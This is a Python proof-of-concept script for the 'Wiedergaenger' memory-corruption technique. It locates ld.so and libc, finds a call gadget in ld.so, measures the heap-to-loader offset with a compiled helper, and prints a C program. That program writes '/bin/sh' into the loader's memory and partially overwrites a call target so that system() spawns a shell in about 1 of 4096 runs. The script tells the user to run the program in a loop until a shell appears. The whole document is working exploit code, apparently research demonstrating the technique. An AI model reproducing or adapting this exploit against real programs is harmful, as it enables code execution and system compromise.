#!/usr/bin/env python3

import subprocess
import struct

FINAL_SHELL_COMMAND = "/bin/sh"

## Step 1: Find absolute path of ld on this system
p = subprocess.Popen("cat /proc/self/maps | grep ld | head -n1", shell = True, stdout = subprocess.PIPE);
out = p.stdout.read().decode().strip()
ldpath = out[out.find('/'):]
print("// [+] ld is {}".format(ldpath))

## Step 2: Find absolute path of libc on this system
p = subprocess.Popen("cat /proc/self/maps | grep libc | head -n1", shell = True, stdout = subprocess.PIPE);
out = p.stdout.read().decode().strip()
libcpath = out[out.find('/'):]
print("// [+] libc is {}".format(libcpath))

## Step 3: Find Wiedergaenger gadget in ld.so, retrieve address of first argument and call target
p = subprocess.Popen("objdump -dMintel {} | grep -EB1 'call.*rip' | grep -EA1 'lea.*rip' | head -n2 | cut -d'#' -f2 | cut -d' ' -f2".format(ldpath), shell = True, stdout = subprocess.PIPE)
arg, target = map(lambda x: int(x, 16), p.stdout.read().decode().strip().split('\n'))
print("// [+] argument for wiedergaenger attack is at ld+0x{:x}".format(arg))
print("// [+] target for wiedergaenger attack is at ld+0x{:x}".format(target))

## Step 4: Find offset of system in libc
p = subprocess.Popen("nm -D {} | grep system | head -n1".format(libcpath), shell = True, stdout = subprocess.PIPE)
system = int(p.stdout.read().decode().strip().split(' ')[0], 16)
print("// [+] system is at 0x{:x} in libc".format(system))

## Step 5: Measure (constant) distance of mmaped heap and ld.so from C helper program
c_helper = """
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
int main(int argc, char **argv)
{
    char *cmd;
    unsigned char *ptr;
    ptr = malloc(0x200000);

    printf("%lx\\n", (unsigned long)ptr);
    asprintf(&cmd, "cat /proc/%u/maps | grep ld | grep r-x | cut -d'-' -f1", getpid());
    system(cmd);
    return 0;
}
"""

open("bootstrap.c", "w").write(c_helper)
p = subprocess.Popen("gcc bootstrap.c -o bootstrap", shell = True, stdout = subprocess.PIPE)
p.stdout.read()

p = subprocess.Popen("./bootstrap", shell = True, stdout = subprocess.PIPE)
mmap, ld_base = map(lambda x: int(x, 16), p.stdout.read().decode().strip().split('\n'))
diff = mmap - ld_base
print("// [+] constant offset between mmaped chunk and ldbase is 0x{:x}".format(diff))
print("// finished compile the following and execute it using while :; do ./a.out; done until you get a shell")
print("// remember that there is only a 1:4096 chance of successful exploitation")

## Step 5: Print example C program performing the weakest form of Wiedergaenger on itself with a chance of 1:4096

print("""
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv)
{
    unsigned char *ptr;
    ptr = malloc(0x200000);
    printf("%p\\n", ptr);
""")

## this sets the payload for system
for i, c in enumerate(FINAL_SHELL_COMMAND):
    print("    ptr[0x{:x}] = '{}';".format(diff + arg + i, c))

print("")

## this performs a partial override to call system in 1 out of 4096 runs
for i in range(3):
    print("    ptr[0x{:x}] = 0x{:02x};".format(diff + target + i, (system >> (i * 8)) & 0xff))

print("""
    return 0;
}""")
